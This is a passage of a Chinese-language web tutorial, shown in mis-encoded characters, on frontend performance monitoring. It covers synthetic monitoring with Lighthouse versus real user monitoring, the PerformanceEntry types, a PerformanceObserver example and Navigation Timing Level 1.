<h3 data-id="heading-4">å¯¹å¼€å‘å’Œç»´æŠ¤æˆæœ¬çš„å½±å“</h3>
<p>å¦‚æœä¸åœ¨å¼€å‘åˆæœŸå°±å…³æ³¨æ€§èƒ½ï¼ŒåæœŸå¯èƒ½ä¼šç§¯ç´¯å¤§é‡çš„æŠ€æœ¯å€ºåŠ¡ï¼Œå¢åŠ ç»´æŠ¤éš¾åº¦ã€‚æ€§èƒ½é—®é¢˜å¾€å¾€è¡¨ç°ä¸ºé¡µé¢å“åº”æ…¢ã€èµ„æºåŠ è½½å¤±è´¥ç­‰ï¼Œè¿™äº›é—®é¢˜å¦‚æœæ²¡æœ‰åŠæ—¶è§£å†³ï¼Œå¯èƒ½ä¼šæˆä¸ºæ—¥åå¼€å‘è¿­ä»£çš„é˜»ç¢ã€‚</p>
<h2 data-id="heading-5">æ€§èƒ½ç›‘æ§çš„ä¸¤ç§æ–¹æ¡ˆ</h2>
<p>å³ä½¿æ€§èƒ½ç›‘æ§è¿™ä¸ªè¯é¢˜å·²ç»å¹¿æ³›è®¨è®ºè¿‡ï¼Œä½†éšç€æŠ€æœ¯æ¼”å˜ï¼Œå®ƒä¹Ÿéœ€è¦ä¸æ–­åœ°æ›´æ–°è¿›åŒ–ã€‚å¦‚ä»Šï¼Œæ€§èƒ½ç›‘æ§ä¸ä»…ä»…æ˜¯ç”¨æ¥æ£€æµ‹é¡µé¢åŠ è½½æ˜¯å¦é¡ºç•…ï¼Œè¿˜æ‰¿æ‹…ç€é¢„è­¦ã€æ•°æ®åˆ†æå’Œä¼˜åŒ–å†³ç­–ç­‰å¤šé‡è§’è‰²ã€‚</p>
<p>æ€§èƒ½ç›‘æ§åˆ†ä¸ºä¸¤å¤§ç±»ï¼š<strong>åˆæˆç›‘æ§</strong>å’Œ<strong>çœŸå®ç”¨æˆ·ç›‘æ§</strong>ã€‚</p>
<h3 data-id="heading-6">åˆæˆç›‘æ§</h3>
<p>åˆæˆç›‘æ§ï¼ˆSynthetic Monitoring, SYNï¼‰æ˜¯<strong>é€šè¿‡æ¨¡æ‹Ÿç”¨æˆ·çš„è¡Œä¸ºæ¥è¯„ä¼°ç½‘ç«™æˆ–åº”ç”¨çš„æ€§èƒ½</strong>ã€‚æ¨¡æ‹Ÿç”¨æˆ·å¯ä»¥æ˜¯è„šæœ¬æˆ–ä¸“ç”¨å·¥å…·ï¼Œå®ƒä»¬åœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”å†…å‘èµ·è¯·æ±‚ï¼Œæ¨¡æ‹Ÿå®é™…ç”¨æˆ·è®¿é—®ï¼Œå¹¶é€šè¿‡é¢„å®šçš„æµ‹è¯•åœºæ™¯æ”¶é›†å„ç§æ€§èƒ½æŒ‡æ ‡ã€‚SYNç›‘æ§é€šå¸¸ç”¨äºæ£€æµ‹æ€§èƒ½ç“¶é¢ˆã€æœåŠ¡å¯ç”¨æ€§ã€å“åº”æ—¶é—´ç­‰æŒ‡æ ‡ï¼Œ<strong>é€‚ç”¨äºåœ¨æ²¡æœ‰çœŸå®ç”¨æˆ·æµé‡æ—¶è¿›è¡Œç›‘æ§</strong>ã€‚</p>
<p>å¼€å‘ä¸­æˆ‘ä»¬å¯ä»¥ç”¨å¸‚é¢ä¸Šè¾ƒä¸ºæˆç†Ÿçš„åˆæˆç›‘æ§å·¥å…·è¿›è¡Œæµ‹é‡ï¼ŒçŸ¥ååº¦æ¯”è¾ƒé«˜çš„åº”è¯¥è¿˜å±<strong>LightHouse</strong>å’Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fpagespeed.web.dev%2F" target="_blank" title="https://pagespeed.web.dev/" ref="nofollow noopener noreferrer">Google Pagespeed Insights</a>ã€‚</p>
<p>å‡è®¾æˆ‘ä»¬ç°åœ¨æƒ³ç”¨LightHouseæ¥ç›‘æµ‹Reactå®˜ç½‘çš„æ€§èƒ½å¦‚ä½•ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæœ¬åœ°å®‰è£…ä¸€ä¸‹LightHouseï¼š</p>
<pre><code class="hljs language-powershell" lang="powershell">npm install -g lighthouse
</code></pre>
<p>è¿™é‡ŒæŒ‡å®šç›‘æµ‹ç½‘ç«™å¹¶å°†æŠ¥å‘Šè¾“å‡ºä¸ºHTMLæ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-powershell" lang="powershell">lighthouse &lt;https://zh-hans.react.dev/&gt; --output html --output-path ./report.html
</code></pre>
<p>ç›‘æµ‹ç»“æœé¡µå·®ä¸å¤šé•¿è¿™æ ·ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60940cc6eddc4c7e8dad64eca94a7120~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=ZlEJYnt%2FaMeE18b%2BIJKxNPrRMb0%3D" alt="Clipboard_Screenshot_1765866239.png" loading="lazy"/>
ä»LightHouseç”Ÿæˆçš„ç»“æœæ¥çœ‹ï¼ŒReactå®˜ç½‘çœ‹èµ·æ¥ä¸æ˜¯å¾ˆâ€œå¥½â€ï¼Œé‚£æ˜¯å¦è¯æ˜Reactå®˜ç½‘çœŸçš„ä¸å¤Ÿå¥½å‘¢ï¼Ÿå®é™…æœªå¿…ã€‚</p>
<p>åˆæˆç›‘æ§æ˜¯å­˜åœ¨å±€é™æ€§çš„ã€‚</p>
<p>ä¸åŒå·¥å…·å¯¹æ€§èƒ½æŒ‡æ ‡çš„é‡è§†ç¨‹åº¦ä¸åŒï¼Œè¿™æ„å‘³ç€ä¸åŒçš„å·¥å…·<strong>ç›‘æ§æŒ‡æ ‡å¾ˆå¯èƒ½æƒé‡ä¸ä¸€è‡´ï¼Œç›‘æµ‹æ–¹æ³•ä¹Ÿä¼šå­˜åœ¨ä¸€å®šçš„å·®å¼‚</strong>ã€‚å¦‚æŸäº›å·¥å…·ä¾§é‡é¡µé¢åŠ è½½æ—¶é—´ï¼Œè€Œå…¶ä»–å·¥å…·å¯èƒ½æ›´å…³æ³¨äº¤äº’å»¶è¿Ÿç­‰ã€‚å¦å¤–ï¼Œå·¥å…·ä½¿ç”¨çš„æµ‹è¯•ç¯å¢ƒã€è®¾å¤‡æ€§èƒ½ã€ç½‘ç»œçŠ¶å†µå’Œæµè§ˆå™¨ç‰ˆæœ¬ä¹Ÿæœ‰æ‰€ä¸åŒï¼Œè¿›ä¸€æ­¥å½±å“äº†ç›‘æµ‹ç»“æœçš„å‡†ç¡®æ€§ã€‚å› æ­¤ï¼Œ<strong>åŒä¸€ç½‘ç«™åœ¨ä¸åŒåˆæˆç›‘æ§å·¥å…·ä¸‹å¯èƒ½ä¼šå¾—å‡ºä¸åŒçš„æ€§èƒ½è¯„ä¼°æ•°æ®</strong>ã€‚</p>
<p>æ€»ç»“æ¥è¯´ï¼š</p>
<p>åˆæˆç›‘æ§æœ‰ä¸€äº›æ˜¾è€Œæ˜“è§çš„ä¼˜ç‚¹ï¼š</p>
<ol>
<li>å®ç°ç®€å•ï¼Œè§£å†³æ–¹æ¡ˆæˆç†Ÿ</li>
<li>å¯ä»¥é‡‡é›†åˆ°æ›´ä¸°å¯Œçš„æ•°æ®</li>
<li>ä¸å½±å“çœŸå®ç”¨æˆ·çš„è®¿é—®æ€§èƒ½</li>
<li>æä¾›å¤šç§å¯è§†åŒ–åˆ†æ</li>
</ol>
<p>ä½†åŒæ—¶åˆæˆç›‘æ§ä¹Ÿä»å­˜ä¸€äº›å±€é™ï¼š</p>
<ol>
<li>æ— æ³•çœŸå®è¿˜åŸæ‰€æœ‰åœºæ™¯ï¼Œè€ƒè™‘å› ç´ è¾ƒå°‘</li>
<li>ç™»é™†ç­‰åœºæ™¯éœ€è¦é¢å¤–è§£å†³ï¼ˆå¼ºåˆ¶ç™»é™†é¡µæˆ–ç®¡ç†å¹³å°é¡µï¼‰</li>
<li>å•æ¬¡æ‰§è¡Œæ•°æ®ä¸ç¨³å®šï¼Œæ•°æ®é‡è¿‡å°</li>
</ol>
<h3 data-id="heading-7">çœŸå®ç”¨æˆ·ç›‘æ§</h3>
<p>çœŸå®ç”¨æˆ·ç›‘æ§ï¼ˆReal User Monitoring, RUMï¼‰æ˜¯<strong>é€šè¿‡æ”¶é›†å®é™…ç”¨æˆ·åœ¨è®¿é—®ç½‘ç«™æˆ–åº”ç”¨æ—¶çš„æ€§èƒ½æ•°æ®æ¥è¯„ä¼°æ€§èƒ½</strong>ã€‚RUM ç›‘æ§ä¸ä¾èµ–äºæ¨¡æ‹Ÿç”¨æˆ·æˆ–è„šæœ¬ï¼Œè€Œæ˜¯ç›´æ¥ä»ç”¨æˆ·çš„è®¾å¤‡ä¸­è·å–æ•°æ®ï¼Œæ•æ‰ä»–ä»¬çš„äº¤äº’è¡Œä¸ºå’Œé¡µé¢åŠ è½½æ—¶é—´ã€‚</p>
<blockquote>
<p>é€šå¸¸æ¥è®²ï¼Œåœ¨çœ‹NetWorké‡Œé¢çš„è¯·æ±‚æ—¶ï¼Œæœ‰ä¸€å †çœ‹ä¸æ‡‚çš„å­—ç¬¦ä¸²ä¸€èˆ¬éƒ½æ˜¯å†…å®¹ä¸ŠæŠ¥hh</p>
</blockquote>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªçœŸå®ç”¨æˆ·ç›‘æ§çš„æµç¨‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa8774f9a94544408eccccead42308b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=y7oMjmensHWDAwcv47a6Yw1VfiU%3D" alt="Clipboard_Screenshot_1765866261.png" loading="lazy"/></p>
<p>çœŸå®ç”¨æˆ·ç›‘æ§çœ‹èµ·æ¥very goodï¼Œæ¯•ç«Ÿæ˜¯åŸºäºâ€çœŸå®â€œçš„æ•°æ®è¿›è¡Œç›‘æ§ï¼Œä½†æ˜¯çœŸå®ç”¨æˆ·ç›‘æ§ä¹Ÿå­˜åœ¨ä¸€å®šçš„å±€é™æ€§ï¼Œä¸»è¦ä½“ç°åœ¨æ•°æ®çš„ä»£è¡¨æ€§å’Œé‡‡é›†çš„å¤æ‚æ€§ä¸Šã€‚</p>
<p>ç”±äº RUM æ˜¯åŸºäºå®é™…ç”¨æˆ·çš„è¡Œä¸ºè¿›è¡Œç›‘æµ‹ï¼Œå› æ­¤<strong>ä¸åŒç”¨æˆ·åœ¨ä¸åŒè®¾å¤‡ã€ç½‘ç»œç¯å¢ƒå’Œåœ°ç†ä½ç½®ä¸‹çš„ä½“éªŒå·®å¼‚å¯èƒ½å¯¼è‡´æ•°æ®çš„ä¸ä¸€è‡´</strong>ã€‚ç”±äºç”¨æˆ·è¡Œä¸ºå¤šæ ·æ€§ï¼ŒRUM æ— æ³•åœ¨çŸ­æ—¶é—´å†…æä¾›å…¨é¢çš„æ€§èƒ½è¯„ä¼°ï¼Œå°¤å…¶æ˜¯åœ¨æµé‡è¾ƒå°æˆ–è®¿é—®é‡è¾ƒä½çš„æƒ…å†µä¸‹ï¼Œæ•°æ®å¯èƒ½å­˜åœ¨ä¸€å®šçš„åå·®ï¼Œä¸è¶³ä»¥æ”¯æ’‘æ€§èƒ½åˆ†æçš„å…¨é¢æ€§ã€‚</p>
<p>æ€»ç»“æ¥è¯´ï¼š</p>
<p>çœŸå®ç”¨æˆ·ç›‘æ§æœ‰ä¸€äº›niceçš„ç‚¹ï¼š</p>
<ol>
<li>æ— éœ€æ¨¡æ‹Ÿï¼Œå®Œå…¨è¿˜åŸçœŸå®åœºæ™¯</li>
<li>ä¸å­˜åœ¨ç™»é™†ç­‰éœ€è¦é¢å¤–è§£å†³çš„åœºæ™¯</li>
<li>åœ¨æ•°æ®é‡è¶³å¤Ÿåºå¤§æ—¶ï¼Œåˆ†æç»“æœæ€»æ˜¯å¥½çš„</li>
</ol>
<p>ä½†æ˜¯ä¹Ÿå­˜åœ¨ä¸€äº›badç‚¹ï¼š</p>
<ol>
<li>å¯èƒ½ä¼šå½±å“çœŸå®ç”¨æˆ·çš„ä½¿ç”¨æ„Ÿå—</li>
<li>æ— æ³•é‡‡é›†ç¡¬ä»¶ç›¸å…³æŒ‡æ ‡</li>
<li>æ— æ³•é‡‡é›†å®Œæ•´çš„èµ„æºåŠ è½½ç€‘å¸ƒå›¾ï¼ˆç°ä»£å¹³å°å…¶å®å¾ˆå¤šéƒ½å¯ä»¥ï¼‰</li>
<li>æ— æ³•å¯è§†åŒ–å±•ç¤ºé¡µé¢çš„åŠ è½½è¿‡ç¨‹ï¼ˆç°ä»£å¹³å°å…¶å®å¾ˆå¤šä¹Ÿéƒ½å¯ä»¥ï¼‰</li>
</ol>
<h3 data-id="heading-8">å¦‚ä½•é€‰æ‹©åˆé€‚çš„æ–¹æ¡ˆ</h3>
<ul>
<li><strong>åˆæˆç›‘æ§</strong>æ›´é€‚åˆåœ¨<strong>å¼€å‘é˜¶æ®µ</strong>å’Œ<strong>ä¸Šçº¿å‰</strong>åšæ€§èƒ½ä¼˜åŒ–ï¼Œå¸®åŠ©å‘ç°ä¸€äº›æ½œåœ¨çš„æ€§èƒ½ç“¶é¢ˆï¼Œå¹¶ä¸”ä¸ä¾èµ–çœŸå®ç”¨æˆ·çš„è®¿é—®é‡ï¼Œé€‚åˆåšå®šæœŸçš„ç›‘æ§å’Œé¢„è­¦ã€‚</li>
<li><strong>çœŸå®ç”¨æˆ·ç›‘æ§</strong>æ›´é€‚åˆç”¨æ¥<strong>æŒç»­ç›‘æ§</strong>ç½‘ç«™æˆ–åº”ç”¨çš„æ€§èƒ½ï¼Œå¹¶ä¸”å¯ä»¥äº†è§£ä¸åŒç”¨æˆ·ç¾¤ä½“åœ¨çœŸå®ç¯å¢ƒä¸‹çš„ä½¿ç”¨ä½“éªŒï¼Œå°¤å…¶å¯¹äº<strong>å¤§è§„æ¨¡çš„å®æ—¶ç›‘æ§</strong>ã€<strong>è·¨è®¾å¤‡</strong>å’Œ<strong>è·¨ç½‘ç»œç¯å¢ƒ</strong>çš„è¡¨ç°éå¸¸æœ‰å¸®åŠ©ã€‚</li>
</ul>
<h2 data-id="heading-9">çœŸå®ç”¨æˆ·æ€§èƒ½æ•°æ®çš„é‡‡é›†æ–¹æ¡ˆ</h2>
<p>psï¼šåˆæˆç›‘æ§çš„çŸ¥è¯†ç›¸å¯¹æ¯”è¾ƒå•ä¸€ï¼Œå¸¸ç”¨çš„å·¥å…·åŸºæœ¬éƒ½æ˜¯å¼€ç®±å³ç”¨ã€‚ç»“åˆå®é™…æ¥è®²ï¼Œå¼€å‘ä¸­å…¶å®æ›´å¤šæ˜¯éœ€è¦æˆ‘ä»¬æŒæ¡çš„äº‹çœŸå®ç”¨æˆ·æ€§èƒ½æ•°æ®çš„é‡‡é›†å’Œåˆ†æï¼Œè¿™é‡Œå’Œå¤§å®¶åˆ†äº«ä¸€ä¸‹RUMçš„ç›¸å…³å†…å®¹:)</p>
<h3 data-id="heading-10">Performance API ä»‹ç»</h3>
<p>åœ¨JSä¸­ï¼Œä¸»è¦è¿›è¡Œæ€§èƒ½æ•°æ®é‡‡é›†çš„APIéƒ½å±äºæµè§ˆå™¨æä¾›çš„Web Performance APIçš„èŒƒç•´ï¼ŒåŸºäºç”¨é€”å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å…«ç±»ï¼š</p>
<blockquote>
<p>å†™åœ¨å‰é¢ï¼š åŸç”Ÿçš„PerformanceAPIå›ºç„¶å¾ˆå¥½ï¼Œä½†æ˜¯å®é™…ä¸šåŠ¡ä¸­ä½¿ç”¨çš„æ—¶å€™è¿˜è¦ç»“åˆå®é™…æƒ…å†µåˆ†æã€‚ æŠ›å‡ºä¸€ä¸ªå¼•å­ï¼šä¾‹å¦‚ä½ çš„é¡µé¢é¦–å…ˆå±•ç¤ºLoadingæ€ï¼Œä½ çš„ä¸šåŠ¡ä¸­å¹¶ä¸è®¤ä¸ºLoadingæ€åŠ è½½å‡ºæ¥æ—¶æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ åŠ è½½çš„æ—¶é—´ï¼ˆå¯èƒ½ä»¥é¡µé¢ä¸šåŠ¡å…ƒç´ ä¸ºå‡†ï¼‰ï¼Œä½†æ˜¯é»˜è®¤ä¸€äº›APIä¼šè®¤ä¸ºLoadingæ€å°±æ˜¯â€œç†æ‰€åº”å½“â€çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ æ‰€ä»¥è¯´ä¹Ÿä¸è¦ä¸€æŠŠæ¢­å“ˆå°±ç”¨PerformanceAPIä¸€æ¡è·¯èµ°åˆ°æ­»å™¢ï½</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c218bb74a00a4e6b9ddcdadb0b6c76a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=oeoseDXsdjiV6GQksYvul6EnPBw%3D" alt="Clipboard_Screenshot_1765866272.png" loading="lazy"/></p>
<p>è¿™é‡Œç€é‡ä»‹ç»ä¸‰ä¸ªé‡è¦ç”¨é€”/è¿‡ç¨‹ï¼Œåˆ†åˆ«æ˜¯<code>Performance Data</code>ï¼Œ<code>Navigation Timing</code>å’Œ<code>Resource Timing</code> ã€‚</p>
<blockquote>
<p>ä¸‹æ–‡ä¸»è¦æ˜¯åˆ†äº«ç”¨é€”ï¼Œç”¨ä¸€äº›å¸¸ç”¨APIæ¥å¢å¼ºå¯¹ç‰¹å®šå†…å®¹çš„ç†è§£ï¼Œæœ‰äº›ç”¨é€”ä¸­çš„APIè¯´çš„å¯èƒ½ä¸å®Œå…¨ï¼Œæ„Ÿå…´è¶£çš„è¯è¿˜æ˜¯è‡ªæŸ¥MDNï½</p>
</blockquote>
<h4 data-id="heading-11">Performance Data</h4>
<p><strong>Performance Data</strong>æ˜¯æ•´ä¸ªWebæ€§èƒ½ç›‘æ§çš„<strong>åŸºç¡€æ ¸å¿ƒ</strong>ï¼Œå®ƒåšä¸ºå…¶ä»–æ‰€æœ‰ç”¨é€”çš„åŸºçŸ³ï¼Œå®ƒä¸»è¦å›ç­”ä¸‰ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li>æµè§ˆå™¨æœ‰å“ªäº›æ€§èƒ½å¯ä»¥æ‹¿ï¼Ÿ</li>
<li>æ€ä¹ˆæ‹¿ï¼Ÿæ€ä¹ˆç›‘å¬ï¼Ÿ</li>
<li>æ€ä¹ˆå¤„ç†è¿™äº›æ‹¿åˆ°çš„ä¸œè¥¿ï¼Ÿ</li>
</ol>
<p>åœ¨æˆ‘ä»¬çŸ¥é“å“ªäº›æ€§èƒ½å¯ä»¥æ‹¿çš„æ—¶å€™ï¼Œæˆ‘ä»¬é¦–å…ˆè¦å…ˆçŸ¥é“æ€§èƒ½æ•°æ®ä»å“ªé‡Œæ¥ï¼Ÿ</p>
<p>å®é™…ä¸Šï¼Œæµè§ˆå™¨å†…éƒ¨ç»´æŠ¤äº†ä¸€ä¸ª<strong>æ€§èƒ½æ¡ç›®é˜Ÿåˆ—</strong>ï¼Œæ¯å½“é¡µé¢åŠ è½½ã€èµ„æºåŠ è½½ã€ç”¨æˆ·äº¤äº’ã€å¼€å‘è€…æ‰“ç‚¹ç­‰äº‹ä»¶å‘ç”Ÿï¼Œéƒ½ä¼šè®°å½•å¯¹åº”çš„æ€§èƒ½æ•°æ®ï¼Œå­˜å‚¨ä¸ºä¸åŒç±»å‹çš„ <code>PerformanceEntry</code> å¯¹è±¡ã€‚</p>
<p>è¿™äº›æ€§èƒ½æ•°æ®é€šè¿‡ç»Ÿä¸€çš„æ¥å£ <code>performance.getEntries()</code> æˆ– <code>PerformanceObserver</code> æä¾›ç»™å¼€å‘è€…ã€‚</p>
<p>æ¯ä¸ª<strong>æ€§èƒ½æ•°æ®æ¡ç›®</strong>éƒ½å±äºæŸç§â€œç±»å‹â€ï¼Œè¿™äº›ç±»å‹è¡¨ç¤ºå®ƒæ˜¯å…³äºä»€ä¹ˆçš„æ€§èƒ½æ•°æ®ã€‚</p>























































<table><thead><tr><th>ç±»å‹ï¼ˆ<code>entryType</code>ï¼‰</th><th>æè¿°</th><th>ä¸¾ä¾‹</th></tr></thead><tbody><tr><td><code>"navigation"</code></td><td>é¡µé¢æ•´ä½“åŠ è½½çš„æ€§èƒ½æ•°æ®</td><td>é¦–æ¬¡åŠ è½½é¡µé¢çš„æµç¨‹</td></tr><tr><td><code>"resource"</code></td><td>é¡µé¢ä¸Šèµ„æºåŠ è½½çš„æ€§èƒ½æ•°æ®</td><td>åŠ è½½å›¾ç‰‡çš„è€—æ—¶</td></tr><tr><td><code>"paint"</code></td><td>é¦–æ¬¡ç»˜åˆ¶ç›¸å…³æŒ‡æ ‡</td><td>FPã€FCPç­‰</td></tr><tr><td><code>"mark"</code></td><td>è‡ªå®šä¹‰çš„èµ·å§‹æ—¶é—´ç‚¹</td><td><code>performance.mark('start')</code></td></tr><tr><td><code>"measure"</code></td><td>è‡ªå®šä¹‰çš„è€—æ—¶æ®µ</td><td><code>performance.measure('duration', 'start', 'end')</code></td></tr><tr><td><code>"longtask"</code></td><td>è¶…è¿‡ 50ms çš„é•¿ä»»åŠ¡</td><td>ä¸»çº¿ç¨‹å¡é¡¿æƒ…å†µ</td></tr><tr><td><code>"largest-contentful-paint"</code></td><td>æœ€å¤§å†…å®¹ç»˜åˆ¶æ—¶é—´</td><td>LCP</td></tr><tr><td><code>"first-input"</code></td><td>é¦–æ¬¡äº¤äº’çš„å“åº”å»¶è¿Ÿ</td><td>FID</td></tr><tr><td><code>"layout-shift"</code></td><td>é¡µé¢å¸ƒå±€å˜åŒ–</td><td>CLS</td></tr></tbody></table>
<blockquote>
<p>å¯ä»¥é€šè¿‡<code>performance.getEntriesByType("xxx")</code>è·å–å¯¹åº”çš„æ•°æ®ï¼Œåœ¨æ§åˆ¶å°è¯•ä¸€è¯•ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d08a10504744e10b958efcbac5555ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=iecnJvT0uTFhLxpiRV4%2Fbrsi4pE%3D" alt="Clipboard_Screenshot_1765866301.png" loading="lazy"/></p>
</blockquote>
<p>ä¸Šé¢æˆ‘ä»¬æ‰€è¯´çš„è·å–<strong>æ€§èƒ½èµ„æºæ¡ç›®</strong>å®é™…ä¸Šå¹¶ä¸å¤Ÿçµæ´»ï¼Œå¦‚æœä½ å¸Œæœ›å®æ—¶ç›‘å¬æ€§èƒ½äº‹ä»¶ï¼ˆæ¯”è¾ƒç»å…¸çš„æ˜¯LCPã€èµ„æºåŠ è½½ç­‰ï¼‰ï¼Œä½¿ç”¨<code>PerformanceObservers</code>æ˜¯æœ€ä½³æ–¹å¼ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">list</span>) =&gt;</span> {
  list.<span class="hljs-title function_">getEntries</span>().<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å®æ—¶è§‚å¯Ÿåˆ°çš„æ€§èƒ½æ•°æ®ï¼š"</span>, entry);
  });
});

observer.<span class="hljs-title function_">observe</span>({
	<span class="hljs-comment">// è®¾å®šç›‘å¬çš„èµ„æºæ¡ç›®</span>
  <span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">"paint"</span>, <span class="hljs-string">"resource"</span>, <span class="hljs-string">"mark"</span>, <span class="hljs-string">"measure"</span>]
});
</code></pre>
<p>åœ¨ç°ä»£æ€§èƒ½ç›‘æ§ä¸­ï¼Œ<code>PerformanceObserver</code>æ—©å·²æˆä¸ºæ„å»ºRUMçš„ç³»ç»Ÿçš„æ ¸å¿ƒç»„ä»¶äº†ã€‚</p>
<p>åˆ°è¿™é‡Œæˆ‘ä»¬å·²ç»â€œæ›¿â€<code>Performance Data</code>å›ç­”äº†ä¸¤ä¸ªé—®é¢˜äº†ï¼Œç¬¬ä¸‰ä¸ªé—®é¢˜è¯¦è§åç»­ï¼šåˆ†ææ€§èƒ½æ•°æ®åŠå½±å“å› ç´ ã€‚</p>
<p>Performance Data è¿™ä¸€éƒ¨åˆ†ï¼Œä¸»è¦<strong>å°±æ˜¯è¡¨è¿°å¦‚ä½•ä»æµè§ˆå™¨æ€§èƒ½å¼•æ“ä¸­æå–å„ç§â€œå…³é”®æ—¶åˆ»â€çš„æ•°æ®ï¼Œå¹¶å°†å…¶ç”¨äºæ€§èƒ½åˆ†æã€ä¼˜åŒ–ä¸ç›‘æ§</strong>ã€‚</p>
<h4 data-id="heading-12">Navigation Timing</h4>
<p><strong>Navigation Timing ä¸»è¦å…³æ³¨æ•´ä¸ªé¡µé¢çš„å¯¼èˆªè¿‡ç¨‹</strong>ï¼Œå¯¹äºå•ä¸ªèµ„æºï¼ˆä¾‹å¦‚å›¾ç‰‡ã€è„šæœ¬ç­‰ï¼‰çš„åŠ è½½æ—¶é—´æ²¡æœ‰è¯¦ç»†çš„åº¦é‡ã€‚</p>
<p>ä¸‹é¢æ˜¯2012å¹´W3Cå‘å¸ƒçš„ç¬¬ä¸€ç‰ˆçš„Navigation Timingçš„å¤„ç†æ¨¡å‹ï¼š</p>
<p>è¯¦æƒ…è§ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.w3.org%2FTR%2Fnavigation-timing%2F" target="_blank" title="https://www.w3.org/TR/navigation-timing/" ref="nofollow noopener noreferrer">W3C Navigation Timing Level 1</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/751b4c94f50044dd9f9a9b852150c5ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=snuqf3tMikeP6YmBR8XC6%2FdIP9w%3D" alt="Clipboard_Screenshot_1765866326.png" loading="lazy"/></p>
<p>Level 1 æä¾›äº†ç»Ÿä¸€çš„ APIï¼Œ<strong>å…è®¸å¼€å‘è€…åœ¨ä¸åŒæµè§ˆå™¨å’Œå¹³å°ä¸Šä»¥ä¸€è‡´çš„æ–¹å¼è·å–é¡µé¢åŠ è½½çš„å…³é”®æ—¶é—´ç‚¹</strong>ï¼Œæ–¹ä¾¿æ€§èƒ½åˆ†æå’Œæ¯”è¾ƒã€‚</p>
<p>å®ƒæ¶µç›–äº†ä»é‡å®šå‘ã€DNS æŸ¥è¯¢ã€TCP è¿æ¥ã€è¯·æ±‚å‘é€ã€å“åº”æ¥æ”¶ï¼Œåˆ° DOM è§£æå’ŒåŠ è½½äº‹ä»¶ç­‰å¤šä¸ªé˜¶æ®µï¼Œå¸®åŠ©å¼€å‘è€…å®šä½æ€§èƒ½ç“¶é¢ˆã€‚</p>
<p>Level 1çš„æ ¸å¿ƒæ¥å£æ˜¯<code>PerformanceTiming</code>å’Œ<code>PerformanceNavigation</code> ï¼Œåˆ†åˆ«é€šè¿‡<code>performance.timing</code> å’Œ<code>performance.navigation</code> æ¥è®¿é—®ã€‚</p>
<p>Level 1 çš„ä¼˜ç‚¹éå¸¸æ˜æ˜¾ï¼š</p>
<ol>
<li>
<p>é«˜æ ‡å‡†çš„API</p>
<p>å°†é¡µé¢å¯¼èˆªçš„å„ç±»æ—¶é—´ä¿¡æ¯å†…å®¹è¿›è¡Œé›†æˆ</p>
</li>
<li>
<p>ç»†ç²’åº¦çš„æ—¶é—´ç‚¹</p>
</li>
<li>
<p>ä¿ƒä½¿å¼€å‘äººå‘˜è¿›è¡Œæ€§èƒ½ä¼˜åŒ–</p>
<p>é¡µé¢æ•°æ®æ‘†åœ¨ä½ çš„é¢å‰ï¼Œè¿«ä½¿ä½ å¯¹è€—æ—¶å¤„è¿›è¡Œä¿®æ”¹ä¼˜åŒ–</p>
</li>
</ol>
<p>è™½ç„¶ Level 1 åœ¨å¾ˆå¤šæ–¹é¢å·²ç»åšçš„è¶³å¤Ÿå¥½äº†ï¼Œä½†æ˜¯ä»ç„¶å­˜åœ¨ä¸€å®šçš„å±€é™æ€§ï¼š</p>
<ol>
<li>
<p>æ•°æ®ç²’åº¦æœ‰é™</p>
<p>è™½ç„¶æ—¶é—´ç‚¹æ¯”è¾ƒå¤šï¼Œä½†æ˜¯å¯¹äºæ›´åŠ æ›´åŠ ç»†ç²’åº¦çš„èµ„æºåŠ è½½å’Œç”¨æˆ·äº¤äº’æ€§èƒ½æŒ‡æ ‡æ”¯æŒä»ç„¶æœ‰é™ï¼Œåœ¨åº”ç”¨è¶Šæ¥è¶Šå¤æ‚çš„åœºæ™¯ä¸‹æ— æ³•æ»¡è¶³æ€§èƒ½åˆ†æéœ€æ±‚</p>
</li>
<li>
<p>éœ€è¦ä½¿ç”¨å¤šAPIå¤„ç†åŒä¸€ä¸ªé€»è¾‘</p>
</li>
<li>
